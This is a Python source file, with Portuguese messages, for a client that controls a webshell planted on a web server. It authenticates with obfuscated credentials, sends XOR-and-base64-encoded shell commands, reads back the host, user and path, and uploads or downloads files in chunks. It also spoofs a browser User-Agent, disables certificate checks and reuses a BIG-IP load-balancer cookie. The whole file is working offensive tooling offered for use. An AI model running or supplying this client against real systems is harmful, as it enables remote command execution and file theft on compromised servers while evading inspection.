#!/bin/python3
import requests, re, os, base64
#from utils import *
from tqdm import tqdm
import argparse, json, pingparsing, sys, os
from colorama import Style, Fore
from colorama import init as colorama_init
from termcolor import colored
from urllib.parse import urlparse
#from menu import *
from time import sleep

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'

colorama_init()

#https://stackoverflow.com/a/41041028/13886183
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
except AttributeError:
    pass

class crypt(object):
    Key = False
    Len = 0
    @staticmethod
    def encode(value, pr=False):
        if len(value) < 1:
            return ''
    
        value = base64.b64encode(crypt.xor(value, pr).encode('latin-1')).decode('latin-1')[::-1]
        if len(value) > 2:
            value = value[2:] + (value[:2])[::-1]
        return value


    @staticmethod
    def decode(value):
        l = len(value)

        if not (l > 0 or crypt.Len > 0):
            return ''
    
        return crypt.xor(base64.b64decode(((value[l - 2:])[::-1] + value[:l - 2] if l > 2 else value)[::-1].encode('latin-1')).decode('latin-1'))

    @staticmethod
    def xor(value, pr=False):
        l = len(value)
        

        if crypt.Len > 0 and l > 0:
            k = crypt.generateKey(l)
            if pr:
                print("keylen:", len(k), "|", "valuelen:", l)
            return ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(value, k))
        
        return ''
        
    @staticmethod
    def generateKey(l):
        if crypt.Len < 1 and l < 1:
            return False

        dif = l - crypt.Len
        if dif > 0:
            return (crypt.Key + crypt.Key * (dif // crypt.Len + (1 if dif % crypt.Len else 0)))[0:l]

        return crypt.Key if dif == 0 else crypt.Key[0:l]
        
        
    def setKey(value):
        crypt.Key = value
        if value:
            crypt.Len = len(crypt.Key)
        else:
            crypt.Len = 0

class Util(object):
    domain = lambda url: urlparse(url).netloc
    def ping(dest):
        ping_parser = pingparsing.PingParsing()
        transmitter = pingparsing.PingTransmitter()
        transmitter.destination = dest
        transmitter.count = 1
        result = ping_parser.parse(transmitter.ping()).as_dict()

        if 'rtt_avg' in result:
            return result['rtt_avg']
        
        return None

    def Fatal(msg):
        print(f'{Style.BRIGHT}{Fore.RED}[FATAL ERROR] {Style.RESET_ALL}{Style.BRIGHT}{msg}{Style.RESET_ALL}')
        sys.exit(0)
    def Error(msg):
        print(f'{Style.BRIGHT}{Fore.RED}[ERROR] {Style.RESET_ALL}{Style.BRIGHT}{msg}{Style.RESET_ALL}')
    def Warn(msg):
        print(f'{Style.BRIGHT}{Fore.YELLOW}[WARNING] {Style.RESET_ALL}{Style.BRIGHT}{msg}{Style.RESET_ALL}')
    def Success(msg):
        print(f'{Style.BRIGHT}{Fore.GREEN}[WARNING] {Style.RESET_ALL}{Style.BRIGHT}{msg}{Style.RESET_ALL}')
    def Info(msg):
        print(f'{Style.BRIGHT}{Fore.BLUE}[INFO] {Style.RESET_ALL}{Style.BRIGHT}{msg}{Style.RESET_ALL}')

    def verifyCodes(res):
        if res.status_code == 500:
            print(res.text.strip())
            Util.Fatal("Erro Interno no servidor!")
            return False
        if res.status_code == 302 or res.status_code == 301 or res.status_code == 404:
            
            Util.Fatal("Verifique se o arquivo ainda existe no servidor, redirecionamento feito para " + res.headers.get('Location'))
        if res.status_code == 403:
            Util.Faltal("Requisição bloqueada, verifique a existência de WAF na aplicação")

        return True

class Menu:
    Config = None
    ConfigFile = ''
    def Init(config, filename='webshell.config.json'):
        Menu.Config = config
        Menu.ConfigFile = filename
        def is_file(file):
            if os.path.isfile(file):
                return file
            raise argparse.ArgumentTypeError(f"Leitura de arquivo: {file} não é um arquivo válido")

        parser = argparse.ArgumentParser(usage='%(prog)s [options]')
        parser.add_argument('-u', '--url', help='Url da webshell', type=str)
        parser.add_argument('--username', help='Nome de usuário da webshell', type=str, default=Menu.Config.User)
        parser.add_argument('--password', help='Nome de usuário da webshell', type=str, default=Menu.Config.Pass)
        parser.add_argument('--key', help='Chave usada para cifrar as mensagens enviadas e recebidas da webshell', type=str, default=Menu.Config.Key)
        parser.add_argument('--bigip-name', help='Nome do Cookie do Big Ip', type=str, default=Menu.Config.CookieIPName)
        parser.add_argument('--bigip-value', help='Valor do Cookie do Big Ip', type=str, default=Menu.Config.CookieIPValue)
        parser.add_argument('--post-cmd', help='Nome da variável que irá receber os comandos na webshell', type=str, default=Menu.Config.PostCmd)
        parser.add_argument('--post-file', help='Nome da variável que irá receber o arquivo na webshell', type=str, default=Menu.Config.PostFile)
        parser.add_argument('--disable-ping', help='Desabilita o ping inicial', action='store_true')
        parser.add_argument('--create-config', help='Cria uma configuração rápida', action='store_true')
        parser.add_argument('--load-config', help='Carrega arquivo de configuração rápido', type=str)
        parser.add_argument('--config-file', help='Arquivo de configuração', type=is_file)
        parser.add_argument('--remove-config', help='Remove uma configuração salva', type=str)
        parser.add_argument('--update-config', help='Atualiza uma configuração existente', type=str)
        

        
        args = parser.parse_args(sys.argv[1:])
        if args.update_config:
            args.create_config = args.update_config
            
        
        if args.config_file:
            Menu.ConfigFile = args.config_file

        if args.create_config:
            if not Menu.CreateConfig():
                return False
        elif args.load_config:
            if not Menu.LoadConfig(args.load_config):
                return False
        elif args.remove_config:
            print(f'Configuração {args.remove_config} removida com sucesso!' if Menu.RemoveConfig(args.remove_config) else f'Configuração {args.remove_config} não foi localizada')
            return False
        else:
            if not args.url:
                print("Informe a url da webshell com --url ou -u")
                return False
            
            Menu.SetConfig(args)
        
        return True

    def RemoveConfig(configname):
        config = Menu.LoadConfigFile(Menu.ConfigFile)

        if not config or configname not in config:
            return False

        del config[configname]
        
        return Menu.SaveConfigFile(Menu.ConfigFile, config)
    def LoadConfigFile(filename):
        if not os.path.isfile(filename):
            return False

        with open(filename, 'r') as file:
            try:
                return json.load(file)
            except Exception as e:
                print(e)
        
        return False
    def SaveConfigFile(filename, data):
        with open(filename, 'w') as file:
            try:
                file.write(json.dumps(data))
                return True
            except Exception as e:
                print(e)
        return False
        
    def CreateConfig():
        options = {
            'name': {'message': 'Nome da configuração: ', 'default': None},
            'url': {'message': f'URL: ({Menu.Config.Url}) ', 'default': Menu.Config.Url},
            'user': {'message': f'Nome de usuário: ({Menu.Config.User}) ', 'default': Menu.Config.User},
            'pass': {'message': f'Senha do usuário: ({Menu.Config.Pass}) ', 'default': Menu.Config.Pass},
            'key': {'message': f'Chave da comunicação: ({Menu.Config.Key}) ', 'default': Menu.Config.Key},
            'ping': {'message': f'Habilitar ping de inicio: ({"yes" if Menu.Config.AllowPing else "no"}) ', 'default': 'yes' if Menu.Config.AllowPing else 'no', 'bool': True},
            'ipname': {'message': f'Nome do Cookie Bip IP: ({Menu.Config.CookieIPName}) ', 'default': Menu.Config.CookieIPName},
            'ipvalue': {'message': f'Valor do Cookie Big Ip: {f"({Menu.Config.CookieIPValue}) " if isinstance(Menu.Config.CookieIPValue, str) else ""}', 'default': Menu.Config.CookieIPValue if isinstance(Menu.Config.CookieIPValue, str) else ''},
            'cmd': {'message': f'Parâmetro para envio dos comandos: ({Menu.Config.PostCmd}) ', 'default': Menu.Config.PostCmd},
            'file': {'message': f'Parâmetro para envio de arquivos: ({Menu.Config.PostFile}) ', 'default': Menu.Config.PostFile}
        }
        try:
            data = {}
            for name in options:
                temp = input(options[name]['message']).strip()
                if len(temp) < 1 and options[name]['default'] != None:
                    temp = options[name]['default']
                
                if 'bool' in options[name]:
                    temp = True if temp.lower() in ['yes', 'y'] else False
                    
                data[name] = temp

            print(json.dumps(data, indent=4))

            temp = input("Salvar configuração? (yes) ").strip()
            if len(temp) < 1:
                temp = 'yes'

            if temp.lower() in ['yes', 'y']:
                config = Menu.LoadConfigFile(Menu.ConfigFile)
                name = data['name']
                del data['name']
                if config:
                    if name in config:
                        temp = input(f"Deseja atualizar a configuração {name}? (yes) ").strip()
                        if len(temp) < 1:
                            temp = 'yes'
                        if temp.lower() not in ['yes', 'y']:
                            print("Operação abortada pelo usuário!")
                            return False
                else:
                    config = {}
                
                config[name] = data
                
                Menu.SaveConfigFile(Menu.ConfigFile, config)
                Menu.LoadConfigData(config[name])
                print("Configuração salva com sucesso!")
                return True
        except KeyboardInterrupt:
            pass
        

        print("\nOperação abortada pelo usuário!")
        return False


    def LoadConfigData(config):
        
        Menu.Config.Url = config['url']
        Menu.Config.User = config['user']
        Menu.Config.Pass = config['pass']
        Menu.Config.Key = config['key']
        Menu.Config.AllowPing = config['ping']
        Menu.Config.CookieIPName = config['ipname']
        Menu.Config.CookieIPValue = config['ipvalue']
        Menu.Config.PostCmd = config['cmd']
        Menu.Config.PostFile = config['file']

    def LoadConfig(name):
        config = Menu.LoadConfigFile(Menu.ConfigFile)
        if not config or name not in config:
            print(f"Configuração {name} não encontrada")
            return False
        
        Menu.LoadConfigData(config[name])
        return True

    
    def SetConfig(args):
        Menu.Config.AllowPing = args.disable_ping
        Menu.Config.User = args.username
        Menu.Config.Pass = args.password
        Menu.Config.Key = args.key
        Menu.Config.PostCmd = args.post_cmd
        Menu.Config.PostFile = args.post_file
        Menu.Config.Url = args.url
        Menu.Config.CookieIPValue = False if not(isinstance(args.bigip_value, str)) or len(args.bigip_value) < 1 else args.bigip_value
        Menu.Config.CookieIPName = False if Menu.Config.CookieIPValue == False or len(args.bigip_name) < 1 else args.bigip_name

class Config(object):
    Url = 'http://localhost'
    User = 'username'
    Pass = 'password'
    Key = 'sgMfr6*Q=UhpXPQcZavk#dkDyQ!Mg=C4XjqjpuMU+ebb#JUH&Hc!GZVD32GQ37mc'
    CookieIPValue = False
    CookieIPName = 'BIGipServer~DMZ_INTERNET_1~grupo-152'

    Domain = ''
    Headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    PostCmd = 'PB0'
    PostFile = 'aBKLUy69wMcFO85eBSMT'
    AllowPing = True

class LocalCommands(object):
    def lping(args=None, l=0):
        if Config.AllowPing == False:
            Util.Warn("Ping desativado!")
            return True
        ms = Util.ping(Config.Domain)

        if ms == None:
            Util.Error(f'{Config.Domain} não está respondendo')
            return False

        Util.Info(f'Ping com host {Config.Domain} é de {ms} ms')
        return True

    def download(args, l=0):
        if l < 1:
            Util.Error("Usage: download [remote file] [local destination]")
            return False
        
        args = args.split(" ", 1)

        if len(args) != 2:
            args.append('./')
        
        dirname = args[1]
        filename = os.path.basename(args[1])
        if not os.path.isdir(dirname):
            dirname = os.path.dirname(dirname)
        else:
            filename = os.path.basename(args[0])
        
        if len(dirname) > 0:
            if dirname != '/' and not dirname.endswith('/'):
                dirname += '/'
            if not os.path.exists(dirname):
                Uitl.Error(f"O diretório '{dirname}' não foi encontrado")

        args[1] = dirname + filename
        if os.path.exists(args[1]) and os.path.isfile(args[1]):
            Util.Error(f"O arquivo '{args[1]}' já existe")
            return False
        
        Shell.download(args[0], args[1])
        return True
    def upload(args, l=0):
        if l < 1:
            Util.Error("Usage: upload [local file] [remote destination]")
            return False
        
        args = args.split(" ", 1)

        if len(args) != 2:
            args.append('./')
        
        if not os.path.isfile(args[0]):
            Util.Error(f"Arquivo {args[0]} não foi encontrado")
            return True
        if len(args[1]) < 1:
            args[1] = './'

        if args[1].endswith('/'):
            args[1] += os.path.basename(args[0])

        return Shell.upload(args[0], args[1])

    def uploadinblocks(args, l=0):
        if l < 1:
            Util.Error("Usage: uploadinblocks [local file] [remote destination] [blocksize]")
            return False
        
        args = args.split(" ", 1)

        if len(args) == 1:
            args.append('./')
        if len(args) == 2:
            args.append('1024')

        if not args[2].isnumeric():
            Util.Warn('Tamanho do bloco deve ser númerico, setado para 1024')
            args[2] = '1024'
        
        args[2] = int(args[2])

        if args[2] < 1:
            Util.Warn("Tamanho do bloco menor que 0, setado para 1024")
            args[2] = 1024
        
        if not os.path.isfile(args[0]):
            Util.Error(f"Arquivo {args[0]} não foi encontrado")
            return True
        if len(args[1]) < 1:
            args[1] = './'

        if args[1].endswith('/'):
            args[1] += os.path.basename(args[0])

        return Shell.uploadinblocks(args[0], args[1], args[2])
            
class Shell(object):
    Session = requests.Session()

    User = False
    Host = False
    Path = False



    def Send(cmd, resend=False):
        try:
            
            res = Shell.Session.post(Config.Url, data={Config.PostCmd: crypt.encode(cmd)}, headers=Config.Headers, verify=False, allow_redirects=False)

            if res.status_code == 401 and not resend:
                Util.Warn("Sessão expirada, tentando autenticar novamente...")

                if not Shell.Auth():
                    Util.Fatal("Não foi possível autenticar, tente novamente")
                
                return Shell.Send(cmd, True)

            
            if not Util.verifyCodes(res):
                return False
            
            info = res.headers.get('X-Info', '')
            if len(info) > 0:
                info = crypt.decode(info).split('|')
                if len(info) == 3:
                    Shell.Path,  Shell.User, Shell.Host = info

            return crypt.decode(res.text.strip())

        except requests.ConnectionError as e:
            Util.Fatal(e)

    def Auth():

        try:
            res = Shell.Session.get(Config.Url, headers={
                **{'Authorization': 'Basic ' + crypt.encode(f'{Config.User}:{Config.Pass}')},
                **Config.Headers
            }, allow_redirects=False, verify=False)

            
            if not Util.verifyCodes(res):
                return False

            
            if res.status_code == 200:
                info = res.headers.get('X-Info', '')
                if len(info) > 0:
                    info = crypt.decode(info).split('|')
                    if len(info) == 3:
                        Shell.Path,  Shell.User, Shell.Host = info
                        return True
            return False

        except requests.ConnectionError as e:
            Util.Fatal(e)

        return False

    def Init():
        Config.Domain = Util.domain(Config.Url)

        if Config.AllowPing and not LocalCommands.lping():
            return True

        crypt.setKey(Config.Key)
        if Config.CookieIPName != False:
            Shell.Session.cookies.set_cookie(requests.cookies.create_cookie(domain=Config.Domain, name=Config.CookieIPName, value=Config.CookieIPValue))

        if not Shell.Auth():
            Util.Error("Falha ao tentar se autenticar na webshell, verifique as credenciais")
            return True


        while True:
            cmd = Shell.cmd()

            if len(cmd) > 0:
                if cmd == 'exit':
                    return True

              
                cmd = Shell.Call(cmd)
                if isinstance(cmd, str) and len(cmd) > 0:
                    print(cmd)

    def Call(cmd):
        args = cmd.split(' ', 1)
        args[0] = args[0].lower()
        if hasattr(LocalCommands, args[0]) and callable(getattr(LocalCommands, args[0])):
            if len(args) < 2:
                args.append('')
            return getattr(LocalCommands, args[0])(args[1], len(args[1]))
        
        return Shell.Send(cmd)
    def cmd():
        return input(f'{Style.BRIGHT}{Fore.GREEN}{Shell.User}@{Shell.Host}{Fore.WHITE}:{Fore.BLUE}{Shell.Path}{Fore.WHITE}${Style.NORMAL} ').strip()

    def download(remotefile, local, resend=False):
        try:
            res = Shell.Session.post(Config.Url, data={Config.PostCmd: crypt.encode(f'download {remotefile}')}, headers=Config.Headers, verify=False, allow_redirects=False, stream=True)

            if res.status_code == 401 and not resend:
                Util.Warn("Sessão expirada, tentando autenticar novamente...")

                if not Shell.Auth():
                    Util.Fatal("Não foi possível autenticar, tente novamente")
                
                return Shell.download(remotefile, local, True)

            if not Util.verifyCodes(res):
                return False

            info = res.headers.get('X-Info', '')
            if len(info) > 0:
                info = crypt.decode(info).split('|')
                if len(info) == 3:
                    Shell.Path,  Shell.User, Shell.Host = info

            length = int(res.headers.get('content-length', 0))
            with open(local, 'wb') as file, tqdm(desc=os.path.basename(local), total=length, unit='iB', unit_scale=True, unit_divisor=1024) as bar:
                for data in res.iter_content(chunk_size=1024):
                    size = file.write(data)
                    bar.update(size)

            Util.Success(f"Arquivo salvo em {local}")
            return True

        except requests.ConnectionError as e:
            Util.Fatal(e)

    def upload(localfile, remotedest, resend=False):
        
        try:
       
            res = Shell.Session.post(Config.Url, data={
                Config.PostCmd: crypt.encode(f'upload {remotedest}')
            }, files={Config.PostFile: open(localfile, 'rb')}, headers={'User-Agent': Config.Headers['User-Agent']}, verify=False, allow_redirects=False)
            
            
            if res.status_code == 401 and not resend:
                Util.Warn("Sessão expirada, tentando autenticar novamente...")

                if not Shell.Auth():
                    Util.Fatal("Não foi possível autenticar, tente novamente")
                
                return Shell.upload(localfile, remotedest, True)

            if not Util.verifyCodes(res):
                return False

            info = res.headers.get('X-Info', '')
            if len(info) > 0:
                info = crypt.decode(info).split('|')
                if len(info) == 3:
                    Shell.Path,  Shell.User, Shell.Host = info

            
            return crypt.decode(res.text.strip())

        except requests.ConnectionError as e:
            Util.Fatal(e)

    def uploadinblocks(localfile, remotedest, blocksize=1024):
        def startupload(filename, resend=False):
            try:
                res = Shell.Session.post(Config.Url, data={
                    Config.PostCmd: crypt.encode(f'startupload {filename}')
                }, headers=Config.Headers, verify=False, allow_redirects=False)

                
                if res.status_code == 401 and not resend:
                    Util.Warn("Sessão expirada, tentando autenticar novamente...")

                    if not Shell.Auth():
                        Util.Fatal("Não foi possível autenticar, tente novamente")
                    
                    return startupload(filename, True)
                

                return (res.status_code == 200, crypt.decode(res.text.strip()) if res.status_code != 200 else '')
            except requests.ConnectionError as e:
                Util.Fatal(e)
        
        def uploadblock(block):
            try:
                res = Shell.Session.post(Config.Url, data={
                    Config.PostCmd: crypt.encode(f'uploadblock {block}')
                }, headers=Config.Headers, verify=False, allow_redirects=False)
                
                if res.status_code == 401 and not resend:
                    Util.Warn("Sessão expirada, tentando autenticar novamente...")

                    if not Shell.Auth():
                        Util.Fatal("Não foi possível autenticar, tente novamente")
                    
                    return uploadblock(block, True)
                
                return (res.status_code == 202, crypt.decode(res.text.strip()) if res.status_code != 202 else '')
            except requests.ConnectionError as e:
                Util.Fatal(e)

        def stopupload():
            try:
                res = Shell.Session.post(Config.Url, data={
                    Config.PostCmd: crypt.encode(f'stopupload')
                }, headers=Config.Headers, verify=False, allow_redirects=False)

                if res.status_code == 401 and not resend:
                    Util.Warn("Sessão expirada, tentando autenticar novamente...")

                    if not Shell.Auth():
                        Util.Fatal("Não foi possível autenticar, tente novamente")
                    
                    return uploadblock(block, True)
                
                return crypt.decode(res.text.strip())
            except requests.ConnectionError as e:
                Util.Fatal(e)

        with open(localfile, 'rb') as file:
            r, m = startupload(remotedest)
            if r != True:
                return m
            
            content = file.read()

            content = crypt.encode(content.decode('latin-1'))

            size = len(content)

            k = size // blocksize + int(size % blocksize != 0)
            
            i = 0
            for j in tqdm(range(0, k)):
                r, m = uploadblock(content[i:i+blocksize])
                if r != True:
                    return m

                i += blocksize
                sleep(0.05)
            
            m = stopupload()
            return m
        return f"Não foi possível abrir o arquivo {localfile}"

def main():

    if not Menu.Init(Config):
        return False
    
    Shell.Init()

if __name__ == '__main__':
    main()
